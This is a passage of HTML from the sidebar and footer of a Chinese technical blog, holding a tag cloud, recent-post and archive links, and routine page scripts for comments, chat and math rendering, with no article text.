18.71px; color: #6638f8">hive</a> <a href="/tags/hll/" style="font-size: 14px; color: #00f">hll</a> <a href="/tags/http/" style="font-size: 17.93px; color: #552ef9">http</a> <a href="/tags/http3/" style="font-size: 14px; color: #00f">http3</a> <a href="/tags/https/" style="font-size: 14px; color: #00f">https</a> <a href="/tags/hyperloglog/" style="font-size: 14px; color: #00f">hyperloglog</a> <a href="/tags/io/" style="font-size: 14px; color: #00f">io</a> <a href="/tags/java/" style="font-size: 25px; color: #ee82ee">java</a> <a href="/tags/jfr/" style="font-size: 14px; color: #00f">jfr</a> <a href="/tags/jit/" style="font-size: 14px; color: #00f">jit</a> <a href="/tags/jvm/" style="font-size: 21.86px; color: #aa5df3">jvm</a> <a href="/tags/jwt/" style="font-size: 14px; color: #00f">jwt</a> <a href="/tags/kafka/" style="font-size: 15.57px; color: #2213fd">kafka</a> <a href="/tags/keepalive/" style="font-size: 14px; color: #00f">keepalive</a> <a href="/tags/kylin/" style="font-size: 14px; color: #00f">kylin</a> <a href="/tags/lfu/" style="font-size: 14px; color: #00f">lfu</a> <a href="/tags/log4j2/" style="font-size: 14px; color: #00f">log4j2</a> <a href="/tags/lru/" style="font-size: 14px; color: #00f">lru</a> <a href="/tags/maven/" style="font-size: 14px; color: #00f">maven</a> <a href="/tags/metaspace/" style="font-size: 14px; color: #00f">metaspace</a> <a href="/tags/monad/" style="font-size: 14px; color: #00f">monad</a> <a href="/tags/mp4/" style="font-size: 14px; color: #00f">mp4</a> <a href="/tags/mybatis/" style="font-size: 14.79px; color: #1109fe">mybatis</a> <a href="/tags/mysql/" style="font-size: 24.21px; color: #dd79ef">mysql</a> <a href="/tags/nc/" style="font-size: 14px; color: #00f">nc</a> <a href="/tags/ncat/" style="font-size: 14px; color: #00f">ncat</a> <a href="/tags/nginx/" style="font-size: 17.14px; color: #4425fa">nginx</a> <a href="/tags/paxos/" style="font-size: 14px; color: #00f">paxos</a> <a href="/tags/pig/" style="font-size: 14px; color: #00f">pig</a> <a href="/tags/pkcrack/" style="font-size: 14px; color: #00f">pkcrack</a> <a href="/tags/python/" style="font-size: 14px; color: #00f">python</a> <a href="/tags/quic/" style="font-size: 14.79px; color: #1109fe">quic</a> <a href="/tags/rabbitmq/" style="font-size: 14px; color: #00f">rabbitmq</a> <a href="/tags/redis/" style="font-size: 22.64px; color: #bb66f2">redis</a> <a href="/tags/restful/" style="font-size: 14px; color: #00f">restful</a> <a href="/tags/rtc/" style="font-size: 14px; color: #00f">rtc</a> <a href="/tags/rust/" style="font-size: 14.79px; color: #1109fe">rust</a> <a href="/tags/scala/" style="font-size: 16.36px; color: #331cfb">scala</a> <a href="/tags/shell/" style="font-size: 17.14px; color: #4425fa">shell</a> <a href="/tags/spark/" style="font-size: 19.5px; color: #7741f7">spark</a> <a href="/tags/spring/" style="font-size: 18.71px; color: #6638f8">spring</a> <a href="/tags/springboot/" style="font-size: 14px; color: #00f">springboot</a> <a href="/tags/springmvc/" style="font-size: 14px; color: #00f">springmvc</a> <a href="/tags/sql/" style="font-size: 14px; color: #00f">sql</a> <a href="/tags/sqlmap/" style="font-size: 14px; color: #00f">sqlmap</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 14.79px; color: #1109fe">sql注入</a> <a href="/tags/sqoop/" style="font-size: 14.79px; color: #1109fe">sqoop</a> <a href="/tags/ss/" style="font-size: 14px; color: #00f">ss</a> <a href="/tags/ssl/" style="font-size: 14px; color: #00f">ssl</a> <a href="/tags/storage/" style="font-size: 14px; color: #00f">storage</a> <a href="/tags/streaming/" style="font-size: 14px; color: #00f">streaming</a> <a href="/tags/tcp/" style="font-size: 17.14px; color: #4425fa">tcp</a> <a href="/tags/tinylfu/" style="font-size: 14px; color: #00f">tinylfu</a> <a href="/tags/udp/" style="font-size: 14px; color: #00f">udp</a> <a href="/tags/utf8/" style="font-size: 14px; color: #00f">utf8</a> <a href="/tags/voip/" style="font-size: 14px; color: #00f">voip</a> <a href="/tags/zip/" style="font-size: 14px; color: #00f">zip</a> <a href="/tags/%E4%B8%80%E8%87%B4%E6%80%A7/" style="font-size: 14px; color: #00f">一致性</a> <a href="/tags/%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/" style="font-size: 14px; color: #00f">一致性哈希</a> <a href="/tags/%E4%B8%AD%E6%96%AD/" style="font-size: 14px; color: #00f">中断</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" style="font-size: 16.36px; color: #331cfb">信息安全</a> <a href="/tags/%E5%86%85%E6%A0%B8%E6%80%81/" style="font-size: 14px; color: #00f">内核态</a> <a href="/tags/%E5%87%BD%E6%95%B0%E5%BC%8F/" style="font-size: 14px; color: #00f">函数式</a> <a href="/tags/%E5%88%86%E5%B8%83%E5%BC%8F/" style="font-size: 14.79px; color: #1109fe">分布式</a> <a href="/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/" style="font-size: 14px; color: #00f">分布式事务</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 14px; color: #00f">反序列化</a> <a href="/tags/%E5%90%91%E9%87%8F%E6%97%B6%E9%92%9F/" style="font-size: 14px; color: #00f">向量时钟</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 14px; color: #00f">安全</a> <a href="/tags/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" style="font-size: 14px; color: #00f">定时任务</a> <a href="/tags/%E5%B9%B6%E5%8F%91/" style="font-size: 20.29px; color: #884af5">并发</a> <a href="/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/" style="font-size: 14px; color: #00f">性能优化</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/" style="font-size: 14px; color: #00f">数据结构与算法</a> <a href="/tags/%E6%97%A5%E5%BF%97/" style="font-size: 14.79px; color: #1109fe">日志</a> <a href="/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/" style="font-size: 14.79px; color: #1109fe">消息队列</a> <a href="/tags/%E7%82%B9%E6%92%AD/" style="font-size: 14px; color: #00f">点播</a> <a href="/tags/%E7%9B%B4%E6%92%AD/" style="font-size: 14px; color: #00f">直播</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 14.79px; color: #1109fe">算法</a> <a href="/tags/%E7%BA%A2%E9%BB%91%E6%A0%91/" style="font-size: 14px; color: #00f">红黑树</a> <a href="/tags/%E7%BA%BF%E7%A8%8B/" style="font-size: 14.79px; color: #1109fe">线程</a> <a href="/tags/%E7%BA%BF%E7%A8%8B%E6%B1%A0/" style="font-size: 14.79px; color: #1109fe">线程池</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 14px; color: #00f">编码</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" style="font-size: 16.36px; color: #331cfb">网络攻防</a> <a href="/tags/%E8%AE%BA%E6%96%87/" style="font-size: 14.79px; color: #1109fe">论文</a> <a href="/tags/%E8%AE%BE%E8%AE%A1/" style="font-size: 14.79px; color: #1109fe">设计</a> <a href="/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" style="font-size: 16.36px; color: #331cfb">设计模式</a> <a href="/tags/%E9%80%BB%E8%BE%91%E6%97%B6%E9%92%9F/" style="font-size: 14px; color: #00f">逻辑时钟</a> <a href="/tags/%E9%85%8D%E7%BD%AE/" style="font-size: 23.43px; color: #cc6ff0">配置</a> <a href="/tags/%E9%95%BF%E8%BF%9E%E6%8E%A5/" style="font-size: 14px; color: #00f">长连接</a> <a href="/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/" style="font-size: 14px; color: #00f">项目管理</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title recent-posts">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/09/24/2023-09/%E6%97%B6%E9%92%9F%E5%90%8C%E6%AD%A5%E5%8F%8A%E4%B8%80%E8%87%B4%E6%80%A7/">时钟同步及一致性</a>
          </li>
        
          <li>
            <a href="/2023/02/03/2023-02/%E8%B0%83%E4%BC%98-ByteString%E7%9B%B8%E5%85%B3%E5%86%85%E5%AD%98%E6%8B%B7%E8%B4%9D%E9%97%AE%E9%A2%98/">调优-ByteString相关内存拷贝问题</a>
          </li>
        
          <li>
            <a href="/2023/02/01/2023-02/%E8%AF%8A%E6%96%AD-jvm%E7%A8%8B%E5%BA%8Fcpu%E9%97%AE%E9%A2%98/">诊断-jvm程序cpu问题</a>
          </li>
        
          <li>
            <a href="/2022/11/21/2022-11/cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98%E9%80%9A%E7%94%A8%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF/">调优-cpu毛刺问题通用优化思路</a>
          </li>
        
          <li>
            <a href="/2022/10/03/2022-10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB-md/">java反序列化攻击</a>
          </li>
        
      </ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title archive">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">九月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">十月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">九月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">八月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">16</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">七月 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">五月 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">四月 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">三月 2018</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">二月 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">一月 2018</a><span class="archive-list-count">13</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">十二月 2017</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">十月 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">五月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">四月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">三月 2017</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">二月 2017</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">十二月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">九月 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">一月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">十二月 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/11/">十一月 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/10/">十月 2014</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">三月 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">十一月 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/09/">九月 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/08/">八月 2013</a><span class="archive-list-count">2</span></li></ul>
    </div>
  </div>


  
</aside>

      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-left">
      &copy; 2014 - 2023 风梦七&nbsp;|&nbsp;
      主题 <a href="https://github.com/giscafer/hexo-theme-cafe/" target="_blank">Cafe</a>
    </div>
     <div id="footer-right">
      联系方式&nbsp;|&nbsp;296671657@qq.com
    </div>
  </div>
</footer>
 
<script src="/jquery/jquery.min.js"></script>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
    <a href="/about" class="mobile-nav-link">关于</a>
  
</nav>
    <img class="back-to-top-btn" src="/images/fly-to-top.png"/>
<script>
// Elevator script included on the page, already.
window.onload = function() {
  var elevator = new Elevator({
    selector:'.back-to-top-btn',
    element: document.querySelector('.back-to-top-btn'),
    duration: 1000 // milliseconds
  });
}
</script>
      

  
    <script>
      var cloudTieConfig = {
        url: document.location.href, 
        sourceId: "",
        productKey: "e2fb4051c49842688ce669e634bc983f",
        target: "cloud-tie-wrapper"
      };
    </script>
    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
    

  







<!-- author:forvoid begin -->
<!-- author:forvoid begin -->

<!-- author:forvoid end -->

<!-- author:forvoid begin -->

<!-- author:forvoid end -->


   <script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>

  <script>
    ((window.gitter = {}).chat = {}).options = {
      //room替换成自己的聊天室名称即可，room的名称规则是：username/roomname
      room: 'xiaoyue26/comment'
    };
  </script>


<!-- author:forvoid end -->


  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      })
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      })
    </script>
    <script type="text/javascript" src="https://cdn.rawgit.com/mathjax/MathJax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


 
<script src="/js/is.js"></script>



  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>


<script src="/js/elevator.js"></script>

  </div>
</body>
</html>